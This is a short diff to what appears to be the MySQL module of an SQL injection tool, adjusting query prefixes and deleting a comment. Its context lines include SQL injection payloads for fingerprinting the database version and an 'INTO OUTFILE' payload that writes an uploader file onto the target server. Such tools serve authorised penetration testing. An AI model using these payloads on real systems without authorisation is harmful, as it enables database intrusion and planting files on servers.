@@ -128,7 +128,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
         logMsg = "executing MySQL comment injection fingerprint"
         logger.info(logMsg)
 
-        query   = agent.prefixQuery("/* NoValue */")
+        query   = agent.prefixQuery(" /* NoValue */")
         query   = agent.postfixQuery(query)
         payload = agent.payload(newValue=query)
         result  = Request.queryPage(payload)
@@ -156,7 +156,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
             for version in range(element[0], element[1] + 1):
                 randInt = randomInt()
                 version = str(version)
-                query   = agent.prefixQuery("/*!%s AND %d=%d*/" % (version, randInt, randInt + 1))
+                query   = agent.prefixQuery(" /*!%s AND %d=%d*/" % (version, randInt, randInt + 1))
                 query   = agent.postfixQuery(query)
                 payload = agent.payload(newValue=query)
                 result  = Request.queryPage(payload)
@@ -285,10 +285,6 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
                 # Or if it is MySQL >= 5.0.0 and < 5.1.2
                 elif inject.getValue("MID(@@hostname, 1, 1)"):
                     kb.dbmsVersion = [">= 5.0.38", "< 5.1.2"]
-                # NOTE: MySQL 5.0.12 introduced SLEEP() function
-                # References:
-                # * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-12.html
-                # * http://dev.mysql.com/doc/refman/5.0/en/miscellaneous-functions.html#function_sleep
                 elif inject.getValue("SELECT 1 FROM DUAL") == "1":
                     kb.dbmsVersion = [">= 5.0.11", "< 5.0.38"]
                 elif inject.getValue("DATABASE() LIKE SCHEMA()"):
@@ -424,7 +420,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
             query  = " LIMIT 1 INTO OUTFILE '%s/%s' " % (directory, uploaderName)
             query += "LINES TERMINATED BY '\\n%s\\n'--" % uploaderQuery
 
-            query = agent.prefixQuery(query)
+            query = agent.prefixQuery(" %s" % query)
             query = agent.postfixQuery(query)
 
             payload = agent.payload(newValue=query)
